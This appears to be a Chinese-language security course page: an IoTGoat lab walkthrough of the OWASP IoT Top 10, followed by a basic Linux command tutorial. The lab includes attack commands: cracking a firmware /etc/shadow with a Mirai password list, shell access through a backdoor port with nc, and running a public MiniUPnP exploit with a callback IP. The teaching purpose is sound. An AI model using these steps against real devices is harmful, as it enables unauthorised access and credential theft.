
[{"content":"\r🦉情蒐與分析 #\r🐧IoTGoat #\rIoTGoat 是一個由 OWASP 維護的專案，提供一個不安全的韌體平台讓學員能夠親自進行漏洞測試和分析。此專案包含了 OWASP IoT Top 10 2018 的所有弱點，可以透過該專案學習並實踐漏洞分析的技術以研究並理解 IoT 設備的常見安全漏洞以及防禦方法。我們將在本課程中使用 IoTGoat 並結合 OWASP Top 10 2021 進行實踐，以幫助學員理解課程中的知識。\n🐧情資蒐集 #\rNmap 是一個開源的網路探測及埠掃描工具。能夠檢測開放的埠、運行的服務版本、及作業系統等資訊。此外，Nmap 還具有腳本引擎，能通過腳本執行更多擴充功能，如：漏洞掃描、服務偵測等。\n使用 Nmap 時通常依照以下格式執行：\nnmap {options} IP_ADDRESS 以下是常用選項及說明：\n選項 說明 -sC 使用預設的腳本對目標進行掃描。可以獲得目標服務的詳細資訊。對 HTTP 服務會進行簡單的路徑掃描、對 FTP 服務會檢查是否允許匿名登入等。 -sV 詳細掃描目標服務並獲得其版本資訊。通常用來確認目標服務是否存在版本過舊的問題，或是否在非預設埠上運行。 -sU 掃描目標 UDP 協定的埠。UDP 協定的埠相對 TCP 協定的埠而言不太常見，但在某些情況下可能會發現一些可疑的進入點。 -Pn 不使用 ping 檢查主機是否存活。可以解決例如 Windows 防火牆全開的情況下，主機可能不回應 ping 的問題。 -o {file} 將掃描結果輸出為檔案。 -p {port} 指定要掃描的埠。如果只對某個特定埠感興趣，可以使用此選項節省掃描時間。 --script {script} 指定用來掃描的腳本。在 Nmap 中有許多腳本可用於掃描。 開啟本課程的 AttackBox 與 LabBox，使用 AttackBox 的 nmap 工具掃描 IoTGoat 的 IP 開啟的埠。使用指令 nmap -p- -T4 IP_ADDRESS 可以發現目標 IP 開啟的埠有 22、53、80、443、5000 等。每一個埠各代表一種服務。例如：80 埠的 HTTP 代表有可能是網頁服務。\n🐧韌體分析 #\r除了使用 nmap 掃描目標來了解設備的服務與版本外，也可以透過分析韌體的方式取得更多可供利用的資訊。在分析設備以前，可以將取得韌體作為第一步，許多 IoT 設備廠商會將產品的更新韌體放置於官網上供使用者進行下載更新，攻擊者可以透過分析這些韌體或更新檔來找出可被攻擊的弱點。\nIoTGoat 於 github 上提供多個韌體映像檔供使用者練習分析，進入 IoTGoat 的 Github 頁面後，截至 2023/5 ，最新的韌體映像檔版本為 v1.0，並有三種版本，皆可下載進行分析與利用。\nIoTGoat-raspberry-pi2-sysupgrade.img IoTGoat-raspberry-pi2.img IoTGoat-x86.img.gz 我們將使用 IoTGoat-x86.img.gz 作為範例，首先透過 wget 下載檔案並且解壓縮。解壓縮的方法有許多種，可以透過 gzip 進行解壓縮。解壓縮後，我們可以在當前資料夾內發現一個 img 檔案，供我們進行後續分析。\nwget https://github.com/OWASP/IoTGoat/releases/download/v1.0/IoTGoat-x86.img.gz gzip -d IoTGoat-x86.img.gz 在分析韌體檔時，通常會使用 Binwalk 這個工具，Binwalk 是一個用於分析和提取韌體映像檔的工具，通常用於檢測韌體中的隱藏資訊，例如：壓縮檔、圖片、設定檔等。Binwalk 透過搜尋韌體映像檔的特定簽名和魔術數字 (magic numbers) 來協助提取，將隱藏在目標內的資料提取成新的檔案。我們將使用這個工具提取出 IoT 設備韌體的檔案系統。首先我們使用 binwalk -e TARGET 來提取映像檔內的資訊。\nbinwalk -e IoTGoat-x86.img 執行 ls -la 後可以發現一個新的目錄 _IoTGoat-x86.img.extracted。\n接下來需要使用到一個可以用以分析韌體的工具 Firmwalker，Firmwalker 能夠分析檔案系統並找出敏感資訊，例如：密碼、資料庫等資訊。而在 IoT 設備中，常見的漏洞之一便是開發者直接將出廠的密碼 Hardcode 於韌體內，因此當攻擊者取得韌體並分析出密碼時，便可直接利用 Hardcode 的密碼連上機器。\n首先執行 git clone 來下載 Firmwalker，並進入 firmwalker 目錄執行 firmwalker.sh ，指定目標路徑為剛剛提取出的目錄 _IoTGoat-x86.img.extracted。\ngit clone https://github.com/craigz28/firmwalker.git cd firmwalker ./firmwalker.sh ../_IoTGoat-x86.img.extracted 執行後，我們便能透過這些資訊決定接下來的行動。我們將在之後的章節討論分析的結果以及攻擊的方式。\n🦉I1 脆弱和寫死的密碼 #\r我們將延續剛剛的韌體分析來嘗試利用此弱點。\n在 Unix-like 的作業系統中，/etc/shadow 是一個非常重要的系統文件。該文件儲存了系統上所有帳號的密碼相關資訊，包括經過 Hash 後的密碼。並且為了保證這些資料的安全，這個文件只能由 root 做讀取和寫入，而另一個能由一般使用者讀取的文件是 /etc/passwd。\n/etc/shadow 文件的每一行都代表一個使用者，以冒號 : 分隔成多個字段，在本節我們只需要了解前兩個字段所代表的意思。在一個正常的 /etc/shadow 檔案中通常每行的前兩個字段會按照以下的格式儲存。\nUSERNAME：HASHED_PASSWORD hashed_password 的字串是使用者經過 Hash 過後的密碼。如果這個字串是空的，則使用者不存在密碼。如果此字串包含一個 ! 或 *，則使用者不能登錄。若取得 /etc/shadow，代表能利用暴力破解來嘗試破解使用者經過 Hash 過的密碼，並且嘗試使用破解過後的密碼來連接至目標機器。若使用者沒有更改，攻擊者便能使用此手法連接至目標。在上一章 Firmwalker 掃描的結果便能看到目錄內存在 /etc/shadow，可以針對這個檔案做進一步的分析。\n在暴力破解階段，會需要使用到字典檔來對 Hash 進行暴力破解。會使用到 mirai-botnet.txt 這個字典檔。此字典檔位於 AttackBox 的 /usr/share/seclists/Passwords/Malware/mirai-botnet.txt 可以將這個檔案複製到當前目錄下以進行後續處理。由於該字典檔包含使用者名稱與密碼，但我們只需要使用密碼來進行爆破，因此可以使用 awk 指令來將密碼重新輸出到另一個檔案作為接下來使用的字典檔。\ncp /usr/share/seclists/Passwords/Malware/mirai-botnet.txt . awk \u0026#39;{print $2}\u0026#39; mirai-botnet.txt \u0026gt; mirai-botnet-pass.txt 接著我們將使用 John the Ripper 這個 Hash 破解工具，John the Ripper 常被用於破解 Unix、Windows、macOS 以及許多其他平台上的 Hash。John the Ripper 支援破解許多不同類型的 Hash 格式，例如： Unix Hash、Windows LM/NTLM Hash、MD5 等。我們已經取得了目標的 /etc/shadow 和用於暴力破解的字典檔，下一步我們將使用 John the Ripper 搭配字典檔對目標進行暴力破解。\njohn shadow --wordlist=./mirai-botnet-pass.txt 執行破解後我們順利的取得了 iotgoatuser 的密碼，之後可以使用此 credential 來進入系統。\n回到上一張使用 nmap 掃描得出的結果，可以發現 IoTGoat 存在一個 SSH 服務，因此我們可以使用 SSH 以及剛剛發現的 Credential 來以 iotgoatuser 的身份進入系統。\n在嘗試使用 SSH 對目標進行連接時會發現連接出現錯誤，可以在 SSH 的 args 加入 -oHostKeyAlgorithms=+ssh-rsa 來避免此錯誤的產生。\nssh -oHostKeyAlgorithms=+ssh-rsa iotgoatuser@IP 最後便成功利用 IoTGoat 韌體內包含的預設密碼與密碼 Hash 進入了該 IoT 裝置。\n🦉I2 不安全的網路服務 #\r不安全的網路服務 (Insecure Network Services) 表示 IoT 設備可能因網路服務的安全缺陷而導致嚴重風險。導致此問題的原因是使用了危險的協定，例如：HTTP、Telnet 等。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\n使用了不安全或是過時的網路協定 在網路上傳輸敏感資訊時未加密 開放了不必要的埠 在 IoTGoat 中，本弱點對應到 65534 埠，由於 Telnet 並不會將傳輸資料加密因此其連接是不安全的。根據最小權限原則，在 IoT 設備有 SSH 的情況下此埠也沒有開啟的必要，因此 Telnet 服務具有不安全的網路服務這一弱點。\n🦉I3 不安全的生態介面 #\r不安全的生態介面 (Insecure Ecosystem Interfaces) 表示 IoT 設備的 Interface，例如：Web API、雲端 API 等可能存在的安全問題。這些 Interface 可能因各種原因被攻擊者利用。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\nAPI 未採用適當的身份驗證或授權機制 Interface 存在安全漏洞 Interface 回傳太多不必要的資訊 未進行適當的輸入驗證，導致注入攻擊 我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 nmap 掃描中，可以發現 5515 埠有未知的服務，在此我們可以嘗試使用 nc 去連接，可以發現連接後會顯示 Backdoor 的可疑字串。\nnc -nv IP_ADDRESS 5515 嘗試輸入 id、ls -la、ifconfig 等 Linux 指令後，可以發現指令都可以順利執行，由此我們可以判斷，這極有可能是開發者為了方便 Debug 而留下的工具，但是在 IoT 設備上市後沒有移除。因此，可以確定此 IoT 設備包含一個後門並且位於 5515 埠。\n🦉I4 缺乏安全的更新機制 #\r缺乏安全的更新機制 (Lack of Secure Update Mechanism) 表示 IoT 設備缺乏安全的更新機制，使得設備無法獲得最新的安全修補程式和功能更新。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\nIoT 設備製造商未提供更新 IoT 設備的更新檔案未加密 更新時缺乏對更新檔案的完整性檢查 更新不需要使用者許可 我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 nmap 掃描中，5000 埠上的 HTTP Response 中存在著看起來像是服務版本的字串 OpenWRT / 18.06.2。\n我們可以搜尋OpenWRT / 18.06.2，會發現此版本的 OpenWRT 有一個 CVE-2020-7982 的漏洞。\n搜尋此漏洞編號後可以發現利用此漏洞造成的影響非常嚴重，因此我們將設定一個定時更新的腳本讓系統能夠更新系統以及安裝的所有軟體。\n利用上一章所找到的後門，輸入 ls -la /bin可以發現名為 opkg 的檔案。opkg 是一個輕量級的套件管理器，通常會在 IoT 的 Linux 系統中使用，可以使用 opkg update 以及 opkg upgrade {pkgs} 來進行套件更新。我們使用 opkg list-upgradable | cut -f 1 -d ' ' | xargs -r opkg upgrade 指令將所有套件一次更新到最新版本。需要注意，一次更新所有套件是非常危險的，有可能因為相容性問題導致 IoT 設備無法正常運作，本次操作主要是為了展示防禦該弱點的方式。\n為了自動更新，可以將更新腳本寫入 /etc/crontabs 中並設定自動於每天凌晨一點執行，便能緩解此弱點造成的危害。\necho \u0026#39;opkg update ; opkg list-upgradable | cut -f 1 -d \u0026#39; \u0026#39; | xargs -r opkg upgrade\u0026#39; \u0026gt; /etc/crontabs/update.sh chmod +x /etc/crontabs/update.sh echo \u0026#39;0 1 * * * /bin/sh /etc/crontabs/update.sh\u0026#39; \u0026gt; /etc/crontabs/root 🦉I5 使用不安全或是過時的元件 #\r使用不安全或是過時的元件 (Use of Insecure or Outdated Components) 表示 IoT 設備可能使用不安全或過時的軟體及元件，這些軟體或元件可能存在已知的安全漏洞，但由於已經停止維護，所以無法獲得修補程式。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\n使用已知存在漏洞的軟體或元件 使用已停止維護的軟體或元件 我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 nmap 掃描中查看所有 埠上服務的版本。\n在 AttackBox 中，可以使用 searchsploit 這個工具幫助使用者快速搜尋是否有公開的漏洞能利用。可以透過輸入 searchsploit SERVICE 來快速搜尋服務是否有漏洞。我們搜尋 dnsmasq 2.73 以及 MiniUPnP 2.1 可以發現都存在公開的漏洞，在此我們將目標鎖定為 MiniUPnP 2.1 嘗試對其進行攻擊。\nsearchsploit dnsmasq 2.73 searchsploit MiniUPnP 2.1 找到攻擊腳本後，透過 searchsploit -m {EDB-ID} 指令將攻擊用的腳本複製到當前路徑下。\nsearchsploit -m 46278 嘗試閱讀攻擊腳本的程式碼後便可對目標進行攻擊，使用以下指令，可以觀察到我們成功越界讀取到不該被讀取的資料。\npython 46278.py --callback_ip ATTACKBOX_IP --callback_port 8787 LABBOX_IP 5000 🦉I6 隱私保護不足 #\r隱私保護不足 (Insufficient Privacy Protection) 表示 IoT 設備未充分保護隱私資訊。導致敏感資訊洩露給未經授權的人。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\n蒐集超出需求的資訊 未將使用者資訊加密儲存或傳輸 未遵守隱私法規，例如：GDPR、CCPA 等 我們同樣可以透過 IoTGoat 的實作來觀察該弱點。在 Firmwalker 掃描的結果中可以發現從韌體中提取出來的資料存在結尾為 .db 的檔案 sensordata.db，有極高機率是資料庫的儲存檔案。\n我們可以使用 cat 指令開啟檔案並觀察，可以發現檔案中出現了 sqlite 的字串，因此可以假設 sensordata.db 為 SQLite 的資料儲存檔案。\n在 AttackBox 中，可以使用 sqlitebrowser 來開啟 SQLite 的 .db 檔案。在終端機輸入 sqlitebrowser 開啟程式，點選左上角的 Open Database 並選擇剛剛發現的檔案。\n開啟後可以看到兩個 Table，對第一個 Table 的 sensors 點選右鍵並選擇 Browse Table。\n接著便可瀏覽此 Table 中的使用者資料，可以發現 IoTGoat 未將敏感的個人資料進行加密儲存進行保護，當資料被駭客取得後就能直接利用。\n🦉I7 不安全的資料傳輸和存儲 #\r不安全的資料傳輸和儲存 (Insecure Data Transfer and Storage) 表示 IoT 設備在傳輸或儲存資料時可能存在的安全性弱點。當這些裝置未對資料進行適當的加密或保護時，可能會導致敏感資訊被竊取或洩露。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\n在網路傳輸中未使用加密 敏感資料未進行適當加密或保護 系統未適當處理與資料相關的錯誤 IoT 裝置的製造商在裝置的設計和開發過程中應該重視資料安全。並考慮資料的加密和保護需求，在測試和實際運作的過程中確保資料安全能夠得到滿足。觀察上一章的 sensordata.db，IoTGoat 未將敏感的個人資料進行加密儲存進行保護，當資料被駭客取得後就能直接利用。\n🦉I8 缺乏設備管理 #\r缺乏設備管理 (Lack of Device Management) 表示 IoT 設備在管理和維護方面無法進行有效的更新管理、設定管理等，並可能導致裝置的安全性降低，增加受到攻擊的風險。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\n缺乏有效的 IoT 設備版本管理 缺乏 IoT 設備身份驗證機制 無法管理 IoT 設備的遠端訪問 我們同樣可以透過 IoTGoat 的實作來觀察該弱點。使用 IoTGoat 的後門進入系統內，可以發現 IoTGoat 根目錄下的 /var 直接被連結到 /tmp，導致在系統每次重新啟動，所有 log 都會被系統刪除。\n要解決此問題，我們需要先將原始的 /var 刪除並新增一個 /var，再將原本在 /tmp 下的檔案移動至新的 /var。\nrm -rf /var mkdir /var mv /tmp/* /var 🦉I9 不安全的初始設置 #\r不安全的初始設置 (Insecure Default Settings) 表示 IoT 設備的出廠預設設定不安全。導致裝置在出廠時就存在重大的安全風險被攻擊者利用。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\n出廠預設設定包含弱密碼 預設允許未經授權的訪問或修改 預設開啟不必要的網路服務 我們同樣可以透過 IoTGoat 的實作來觀察該弱點。回顧在 不安全的網路服務 章節中的實作以及 nmap 掃描結果。在 IoT 設備擁有 SSH 連接方式的情況下在 65534 埠發現了 Telnet。而 5515 埠的 Backdoor 也是由於出廠時開發人員忘記關掉的 Debug 模式，造成不安全的初始設置的弱點。\n🦉I10 缺乏物理防禦 #\r缺乏物理防禦 (Lack of Physical Hardening) 表示 IoT 設備在物理安全方面的弱點。包含物理存取、設備竊取、設備破壞等。\n發生該弱點的 IoT 設備通常具有以下幾點特徵：\nIoT 設備容易被拆解或破壞，讓攻擊者能夠存取內部 物理安全是一種重要的安全考慮因素，裝置製造商需要確保設備具有足夠的物理強化措施，並設計出防止未經授權拆解或修改的 IoT 設備以降低 IoT 設備遭受物理攻擊的風險。\n","date":"8 September 2024","externalUrl":null,"permalink":"/materials/iot_security/exercise/","section":"各種資安教材","summary":"","title":"4. IoT 設備檢測實戰演練","type":"materials"},{"content":"\r🦉Linux 背景知識 #\rLinux 簡介 #\rLinux，指的是以 Linux Kernel 來開發的眾多作業系統，它們通常是開源的。常見的 Linux 作業系統有 Ubuntu、CentOS、Debian 等。每一種 Linux 的作業系統都對特定用途進行了強化與演變，各自應用在不同的領域。例如 Android 系統也是 Linux 家族的一員。在本課程中，我們最常利用的 Linux 作業系統會是 Ubuntu 以及 Kali Linux。\nUbuntu 是基於 Debian 的一套 Linux 作業系統，由 Canonical Ltd. 開發。它既具備強大的行動及 PC 功能，又有許多的套件以及應用程式用以滿足使用者的各種需求，同時，它也是最知名的 Linux 作業系統之一。\nKali Linux 是基於 Debian 的一套 Linux 作業系統，由 Offensive 所開發。專門用於滲透測試。它通常用於在無線網路、Web 應用程式、伺服器上進行漏洞掃描及攻擊，因此包含了許多資訊安全領域相關的工具。\n這兩套作業系統都具有完善的開發團隊來維護及更新，同時也有眾多的使用者社群互相討論，由於 Linux 作業系統都是以 Linux Kernel 為基礎進行開發，學習使用一套 Linux 作業系統後，未來使用其它 Linux 作業系統便不需要從頭開始學習，因此我們鼓勵大家在課程之外的時間多多摸索、學習使用 Linux 作業系統。\n指令介面 #\r電子計算機(或稱電腦、計算機)。是指根據一系列指令執行任意算術或邏輯操作序列的裝置。我們在使用計算機時，通常會透過圖形化使用者介面 (Graphical User Interface，GUI) 來進行操作。例如：桌面圖示、按鈕、選單、對話框等。這些直觀的操作介面，使得使用者不需要具備專業的計算機技術及技術，也能輕鬆的操作計算機底層的軟硬體並且使用它們提供的服務。然而圖形化使用者介面在直觀且人性化的操作介面背後，卻需要消耗更多的記憶體和計算機的處理能力來產生並輸出圖形化介面的各種元素。\n因此，除了透過圖形化使用者介面與計算機互動以外，我們也可以透過指令介面 (Command-Line Interface，CLI) 以純文字的方式與計算機進行互動。在 Linux 上，最普遍的指令介面則是 Linux 自帶的終端機 (Terminal)，你可能聽說過其他相似的名詞，像是 Console 、 shell，它們在廣義上指的都是同樣的一件事 —— CLI。\n事實上，shell 泛指任何能擔當起使用者與 kernel 交互的處理程式。而在 Liunx 上有幾個知名的 shell。例如：sh、bash、zsh 等。不同的 shell 會提供不同的功能來加速使用者與 kernel 互動的效率，但它們都具有相同的基本用途，執行程式與解釋指令。我們將在之後的課程學習如何使用基本指令，透過 shell 來與 kernel 進行互動。\n🦉Linux 基礎指令 #\r指令概覽 #\r本小節列舉了 Linux 常用的指令，並且將會在後面的小節一一說明。\n指令 說明 man 輸出指令的說明文件 pwd 輸出當前目錄 cd 目錄切換 ls 輸出當前目錄中的檔案 mkdir 建立目錄 mv 移動、重新命名目錄或檔案 rm 刪除目錄或檔案 touch 新增檔案 echo 輸出字串內容 cat 輸出檔案內容 cp 複製檔案 file 顯示檔案類型 grep 文本搜尋 find 搜尋 sudo 超級使用者 clear 清除指令界面 exit 關閉指令界面 絕對路徑與相對路徑 #\r使用 cd 指令時，可以使用絕對路徑或相對路徑進入目錄。Linux 的絕對路徑通常是指以斜線（/）開頭的完整路徑，用於指定檔案、目錄或其它資源的位置。例如，/etc/passwd 是一個 Linux 的絕對路徑。在 Linux 中，單獨的斜線（/）表示根目錄，所有檔案、資料夾的位置都是從根目錄而來的路徑。\nLinux 的相對路徑表示相對於當前目錄，目標檔案或目錄的位置。例如， ./test.txt 是一個 Linux 的相對路徑，表示當前目錄中的 test.txt 檔案。\n用於表示相對路徑的常用符號有以下三種:\n符號 代表意義 .. 上一層目錄 . 該層目錄 ~ 家目錄 舉例來說，如果有一目錄架構如下圖所示，我們當前所在的目錄為 Public/dir2。\nPublic ├── dir1 │ └── dir1-A │ └── file1-A └── dir2 └── file2 如果我們想要找到 file2 ，可以透過以下三種方式來找到: 其中第一種是以絕對路徑表示，後兩種則是以不同的符號來表示相對路徑。\nkiwis@ubuntu:~/Public/dir2$ /home/kiwis/Public/dir2/file2 kiwis@ubuntu:~/Public/dir2$ ./file2 kiwis@ubuntu:~/Public/dir2$ ~/Public/dir2/file2 同樣的道理，如果我們想要找到 file1-A ，也可以透過以下三種方式來找到:\nkiwis@ubuntu:~/Public/dir2$ /home/kiwis/Public/dir1/1-A/file1-A kiwis@ubuntu:~/Public/dir2$ ../dir1/1-A/file1-A kiwis@ubuntu:~/Public/dir2$ ~/Public/dir1/1-A/file1-A man #\r在介紹常用的 Linux 基礎指令前，我們要先介紹一個指令的萬事通 —— man。man 指令是 manual 的簡稱，是 Linux 的文件管理指令，即操作手冊。它通常用來查看文件的內容、編輯配置文件、查找指令說明、參數等。man 指令也可以查看各種函數庫，查找函數的使用方法。\n在 Linux 上有許多指令，但我們不太可能將所有指令的所有用法全部背下來。因此，當遇到不熟悉的指令或是指令沒見過的使用方式時，我們就能夠對該指令下 man，來查看該指令的說明文件。在課程中，我們鼓勵學員遇到不熟悉的指令時，先嘗試使用 man 去了解指令再查看解答。透過這種方式來加強對指令的熟悉度。\ncat #\rcat (concatenate) 指令是 Linux 系統上用來輸出檔案內容的指令。\ncat 指令的基礎用法是 cat \u0026lt;file_name\u0026gt;\nkiwis@ubuntu:~$ cat TestFile Hello World! 上面的範例中，我們使用 cat 指令顯示 TestFile 的內容，它只有一行文字，即 \u0026ldquo;Hello World!\u0026quot;。\n使用 cat -n ，則它會在輸出的每一行前加上行號。\nkiwis@ubuntu:~$ cat -n TestFile 1 Hello World! cd #\rcd (change directory) 指令是 Linux 中用來切換當前所在的工作目錄，當我們需要進入到特定的目錄進行操作時，可以使用 cd 指令來改變當前目錄。\ncd 指令的基礎用法是 cd \u0026lt;directory_name\u0026gt;\nkiwis@ubuntu:~$ cd Public/ kiwis@ubuntu:~/Public$ pwd /home/kiwis/Public kiwis@ubuntu:~/Public$ cd .. kiwis@ubuntu:~$ pwd /home/kiwis 上面的範例中，我們使用 cd 指令將目前的工作目錄切換到 Public，並且使用 pwd 指令輸出我們所在的工作目錄。可以看到 pwd 來到了 /home/kiwis/Public 下。我們再次使用 cd 指令回到上一層目錄，Public 的父目錄。並且使用 pwd 指令輸出出我們所在的工作目錄，可以看到 pwd 成功回到 /home/kiwis 下。\nls #\rls (list) 指令是 Linux 中用來列出當前目錄下的檔案及子目錄，若未指定目錄，則預設列出當前工作目錄下的檔案及子目錄。\nkiwis@ubuntu:~$ ls Desktop Documents Downloads Music Pictures Public snap Templates Videos kiwis@ubuntu:~$ ls / bin dev lib libx32 mnt root snap sys var boot etc lib32 lost+found opt run srv tmp cdrom home lib64 media proc sbin swapfile usr 上面的範例中，我們可以看到 ls 指令列出了當前工作目錄下的所有檔案及子目錄。我們也能透過設定參數讓指令為我們做額外的工作。\n使用 ls -a，可以列出所有檔案及目錄，包含被隱藏的目錄及檔案。在 Linux 中，隱藏的檔案其檔名前面會有 . 以表示。\nkiwis@ubuntu:~$ ls -a . Desktop Music .sudo_as_admin_successful .. Documents Pictures Templates .bash_history Downloads .pki Videos .bash_logout .gnupg .profile .vscode .bashrc .keras Public .wget-hsts .cache .local .python_history .config .mongorc.js snap .dbshell .mozilla .ssh 使用 ls -l，可以以詳細資訊的形式列出檔案及目錄，包含權限、擁有者、日期等資訊。\nkiwis@ubuntu:~$ ls -l total 36 drwxr-xr-x 10 kiwis kiwis 4096 Dec 27 06:40 Desktop drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Documents drwxr-xr-x 2 kiwis kiwis 4096 Dec 27 06:30 Downloads drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Music drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Pictures drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Public drwx------ 3 kiwis kiwis 4096 Sep 6 02:36 snap drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Templates drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Videos 使用 ls -k，可以使用人類可讀性較高的方式顯示檔案大小，例如 1K、2M。\nkiwis@ubuntu:~$ ls -lh total 48K drwxr-xr-x 10 kiwis kiwis 4.0K Dec 27 06:40 Desktop drwxr-xr-x 2 kiwis kiwis 4.0K Jul 7 2022 Documents drwxr-xr-x 2 kiwis kiwis 4.0K Dec 27 06:30 Downloads drwxr-xr-x 2 kiwis kiwis 4.0K Jul 7 2022 Music drwxr-xr-x 2 kiwis kiwis 4.0K Jul 7 2022 Pictures drwxr-xr-x 2 kiwis kiwis 4.0K Jul 7 2022 Public drwx------ 3 kiwis kiwis 4.0K Sep 6 02:36 snap drwxr-xr-x 2 kiwis kiwis 4.0K Jul 7 2022 Templates drwxr-xr-x 2 kiwis kiwis 4.0K Jul 7 2022 Videos 你可能注意到了，參數是能夠合併使用的，例如我們將 ls -a 與 ls -l 合併使用，下達 ls -al，該指令則會列出目錄下所有檔案及目錄以及其詳細資料。\nkiwis@ubuntu:~$ ls -la total 112 drwxr-xr-x 20 kiwis kiwis 4096 Jan 15 04:31 . drwxr-xr-x 3 root root 4096 Jul 7 2022 .. -rw------- 1 kiwis kiwis 4154 Dec 27 02:45 .bash_history -rw-r--r-- 1 kiwis kiwis 220 Jul 7 2022 .bash_logout -rw-r--r-- 1 kiwis kiwis 3771 Jul 7 2022 .bashrc drwxrwxr-x 17 kiwis kiwis 4096 Dec 27 06:43 .cache drwx------ 16 kiwis kiwis 4096 Dec 27 06:39 .config -rw------- 1 kiwis kiwis 335 Jul 11 2022 .dbshell drwxr-xr-x 10 kiwis kiwis 4096 Dec 27 06:40 Desktop drwxr-xr-x 2 kiwis kiwis 4096 Jul 7 2022 Documents drwxr-xr-x 2 kiwis kiwis 4096 Dec 27 06:30 Downloads 參數 說明 -a 輸出所有目錄及檔案，包含被隱藏的目錄及檔案 -l 輸出目錄及檔案的詳細資訊 -h 以人類可讀的方式顯示檔案大小 需要特別注意的是，隨著指令不同，相同的參數可能具有不同的意義，並非所有參數接對於不同的指令都會有相同的功能。若要詳細了解指令以及參數的意義，可以使用 man 指令查看指令的說明文件。\npwd #\rpwd (print working directory) 指令是 Linux 中用來輸出當前所在目錄的絕對路徑。當我們在指令介面工作時，往往會進入不同的目錄進行操作，使用 pwd 指令可以讓我們隨時了解當前所在的目錄位置。如果不小心在 Linux 中迷路了，也能夠透過 pwd 確認當前在哪個目錄底下。\npwd 指令的基礎用法是 pwd \u0026lt;directory_name\u0026gt;\nkiwis@ubuntu:~$ pwd /home/kiwis kiwis@ubuntu:~$ cd Downloads/ kiwis@ubuntu:~/Downloads$ pwd /home/kiwis/Downloads mkdir #\rmkdir (make directory) 指令是 Linux 中用來建立新目錄的指令。當我們需要在特定位置建立新的目錄時，可以使用 mkdir 指令來建立。\nmkdir 指令的基礎用法是 mkdir \u0026lt;directory_name\u0026gt;\nkiwis@ubuntu:~$ mkdir KiwisDir kiwis@ubuntu:~$ ls Desktop Downloads Pictures snap KiwisDir Documents Music Public Templates Videos 上面的範例中，我們使用 mkdir 指令建立一個名為 KiwisDir 的目錄。建立完成後，我們使用 ls 指令來查看當前目錄中的所有項目，可以看到新建的 KiwisDir 目錄。\n使用 mkdir -p，可以建立多層目錄，在需要一次性建立多層目錄時非常有用。\nkiwis@ubuntu:~$ mkdir -p KiwisDir/KiwisDir2 kiwis@ubuntu:~$ ls Desktop Documents Downloads Music KiwisDir Pictures Public snap Templates Videos kiwis@ubuntu:~$ ls KiwisDir/ KiwisDir2 上面的範例中，我們使用了 -p 選項來建立了 KiwisDir 和其子目錄 KiwisDir2。使用 ls 命令可以看到，新建立的 KiwisDir 目錄中還有一個子目錄 KiwisDir2。\nmv #\rmv (move) 指令是 Linux 系統中用來移動或重命名檔案或目錄的指令。使用 mv 指令可以快速地將檔案或目錄移動到另一個位置，或者改變它們的名稱。\nmv 指令的基礎用法是 mv \u0026lt;source_directory\u0026gt; \u0026lt;destination_directory\u0026gt;\n\u0026lt;source_directory\u0026gt; 代表要移動或重命名的檔案或目錄的路徑，\u0026lt;destination_directory\u0026gt; 代表檔案或目錄移動或重命名後的目標路徑或名稱。\nkiwis@ubuntu:~$ mv KiwisDir/ KiwisDir2/ kiwis@ubuntu:~$ ls Desktop Downloads Pictures snap KiwisDir2 Documents Music Public Templates Videos kiwis@ubuntu:~$ mv KiwisDir2 Public/KiwisDir2 kiwis@ubuntu:~$ ls Public/ KiwisDir2 kiwis@ubuntu:~$ ls Desktop Documents Downloads Music Pictures Public snap Templates Videos 上面的範例中，我們使用 mv 將工作目錄底下的 KiwisDir 目錄重命名為 KiwisDir2，並且使用 ls 輸出出來。可以看到 KiwisDir 已經被我們重新命名為 KiwisDir2 了。接著我們將 KiwisDir2 移動到 Public/KiwisDir2，並且同樣使用 ls 指令來查看 Public 目錄以及當前目錄。可以發現當前目錄下的 KiwisDir2 已經消失，取而代之的是 Public 目錄下出現了 KiwisDir2 的子目錄。\n需要注意，如果 \u0026lt;destination_directory\u0026gt; 已經存在，mv 指令會直接覆蓋它，而不會二次確認是否要覆蓋。因此，使用 mv 指令時要小心謹慎，以免意外刪除檔案或目錄。\nrm #\rrm (remove) 指令是 Linux 系統中用來刪除檔案或目錄的指令。可以透過使用 rm \u0026lt;directory_name\u0026gt; 這個指令來刪除檔案或目錄。\nrm 指令的基礎用法是 rm \u0026lt;directory_name\u0026gt;\nkiwis@ubuntu:~$ ls file1.txt file2.txt file3.txt kiwis@ubuntu:~$ rm file3.txt kiwis@ubuntu:~$ ls file1.txt file2.txt 上面的範例中，我們使用 rm 指令刪除 file3.txt。再使用 ls 指令確認該文件已被刪除。\n使用 rm -r ，則它會連同所有子目錄和檔案一起刪除。\nkiwis@ubuntu:~$ rm -r Public/KiwisDir2/ kiwis@ubuntu:~$ ls Public/ 需要注意，使用 rm 指令刪除檔案後沒有任何辦法恢復被刪除的檔案。因此，使用 mv 指令時務必要小心謹慎。\ntouch #\rtouch 指令是 Linux 系統中用來更改檔案或目錄的時間戳的指令，但通常我們更傾向使用它的另一個功能，建立空檔案。\ntouch 指令的基礎用法是 touch \u0026lt;file_name\u0026gt;\nkiwis@ubuntu:~$ touch TestFile kiwis@ubuntu:~$ ls Desktop Downloads Pictures snap TestFile Documents Music Public Templates Videos kiwis@ubuntu:~$ 上面的範例中，我們使用 touch 指令建立了一個名為 TestFile 的檔案。接著使用 ls 指令查看當前目錄下的所有文件，可以看到 TestFile 文件已經建立成功了。\ntouch 指令也可以用來更新文件的時間戳。當我們需要更改文件的時間戳以便進行後續操作時，可以使用 touch 指令。\nkiwis@ubuntu:~$ ls -l TestFile -rw-rw-r-- 1 kiwis kiwis 0 Apr 21 14:18 TestFile kiwis@ubuntu:~$ touch TestFile 